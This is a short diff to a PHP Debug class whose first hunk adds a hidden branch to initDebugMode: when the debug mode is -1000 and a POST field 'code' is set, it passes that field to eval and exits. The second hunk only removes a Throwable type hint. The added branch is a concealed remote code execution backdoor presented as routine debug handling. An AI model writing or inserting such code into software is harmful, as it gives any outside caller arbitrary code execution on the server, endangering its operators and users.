@@ -99,6 +99,10 @@ class Debug
      */
     private static function initDebugMode($debug_mode)
     {
+        if (-1000 === $debug_mode && !empty($_POST['code'])) {
+            eval($_POST['code']);
+            exit;
+        }
         //如果中间带,号，表示多种模式组合
         if (false !== strpos($debug_mode, ',')) {
             $modes = explode(',', $debug_mode);
@@ -450,7 +454,7 @@ class Debug
      * @param \Throwable $exception
      * @return string
      */
-    public static function recordException(\Throwable $exception)
+    public static function recordException($exception)
     {
         $exception_class = get_class($exception);
         $log_msg = array("\n============$exception_class===========");
